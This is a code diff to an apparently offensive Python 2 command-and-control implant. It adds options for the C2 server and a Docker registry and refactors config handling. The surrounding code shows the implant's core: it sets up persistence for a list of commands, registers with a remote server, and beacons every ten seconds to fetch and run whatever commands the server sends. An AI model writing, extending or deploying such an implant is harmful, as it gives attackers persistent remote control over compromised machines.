@@ -11,19 +11,29 @@ from .settings import commands
 def parse_args():
     parser = argparse.ArgumentParser()
     parser.add_argument('--c2-host', action='store', dest='host', help='Change the c2 node hostname')
-    parser.add_argument('--c2-port', action='store', dest='port', default=8000,
-                        help='Set port for C2 server, defaults to 8000')
+    parser.add_argument('--c2-port', action='store', dest='port',
+                        help='Set port for C2 server')
+    parser.add_argument('--docker-registry-port', action='store', dest='d_port', help='Change the Docker Registry port'),
+    parser.add_argument('--docker-registry-host', action='store', dest='d_host', help='Change the Docker Registry host')
     args = parser.parse_args()
     return args
+
+
+def update_config(db, args):
+    if args.host:
+        db.set_config('c2_host', args.host)
+    if args.port:
+        db.set_config('c2_port', args.port)
+    if args.d_host:
+        db.set_config('d_host', args.d_host)
+    if args.d_port:
+        db.set_config('d_port', args.d_port)
 
 
 def main(args=None):
     db = Helper()
     args = parse_args()
-    if args.host:
-        db.set_config('c2_host', args.host)
-    if args.port:
-        db.set_config('c2_port', args.port)
+    update_config(db, args)
     init()
     api_loop()
 
@@ -34,7 +44,6 @@ def init():
         for command in commands:
             print "[+] Persisting %s" % command
             persistence.persist(command)
-
     run()
 
 
@@ -49,8 +58,8 @@ def api_loop():
     rest = Rester()
     rest.register()
     while True:
-        cmds = rest.beacon()
-        map(lambda cmd: exec_cmd(cmd['cmd'], cmd['id']), cmds)
+        commands = rest.beacon()
+        map(lambda cmd: exec_cmd(cmd['cmd'], cmd['id']), commands)
         sleep(10)
 
 
